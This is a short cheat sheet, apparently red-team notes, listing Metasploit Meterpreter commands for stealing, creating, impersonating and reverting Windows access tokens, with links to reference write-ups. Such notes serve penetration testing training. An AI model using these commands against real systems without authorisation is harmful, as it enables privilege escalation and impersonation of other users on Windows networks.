# Metasploit

## 01 - Steal Token

```
meterpreter > steal_token <pid>
```

Enumerate current user and process identifier.

```
meterpreter > getuid

meterpreter > getpid
```

Drop token to revert back to original self.

```
meterpreter > drop_token
```

## 02 - Make Token

```
meterpreter > run post/windows/manage/make_token domain=<domain> username=<username> password=<password>
```

Enumerate current user with privileges.

```
meterpreter > getuid

meterpreter > getprivs
```

## 03 - Token Impersonation

List available usernames as delegation tokens to impersonate.

```
meterpreter > list_tokens -u

meterpreter > impersonate_token "<DOMAIN>\<username>"
```

List available groups as delegation tokens to impersonate.

```
meterpreter > list_tokens -g
```

Enumerate current user with privileges.

```
meterpreter > getuid

meterpreter > getprivs
```

## 04 - Revert Token

Revert back to original privileges.

```
meterpreter > rev2self
```

---
## References

- [Rapid7: Metasploit Framework - Make Token Manage Post Module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/make_token.md)

- [Pentestlab Blog: Token Stealing and Incognito](https://pentestlab.blog/2012/08/07/token-stealing-and-incognito/)

- [Demystifying Cobalt Strike’s “make_token” Command](https://research.nccgroup.com/2023/11/10/demystifying-cobalt-strikes-make_token-command/)

- [DMCXBlue Gitbook: Privilege Escalation Access Token Manipulation](https://dmcxblue.gitbook.io/red-team-notes/privesc/access-token-manipulation)

- [Exploit DB: Abusing Token Privileges For Local Privilege Escalation](https://www.exploit-db.com/papers/42556)